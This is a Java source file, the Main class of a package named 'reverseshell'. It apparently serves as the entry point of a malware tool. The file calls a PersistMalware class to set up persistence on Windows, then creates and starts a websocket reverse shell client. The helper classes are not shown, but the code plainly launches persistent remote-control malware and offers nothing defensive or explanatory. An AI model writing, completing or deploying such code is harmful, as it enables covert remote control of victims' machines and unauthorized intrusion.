package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.service.impl.ReverseShell;
import com.mtattab.reverseshell.service.persistence.PersistMalware;

import java.net.URISyntaxException;

public class Main {



    public static void main(String[] args) {

        PersistMalware persistMalware = new PersistMalware();
        System.out.println(persistMalware.createPersistenceWindows());


//        start reverse shell
        WebsocketReverseShellService reverseShell= new ReverseShell();
        reverseShell.createClient();
        reverseShell.startReverseShell();
    }




}

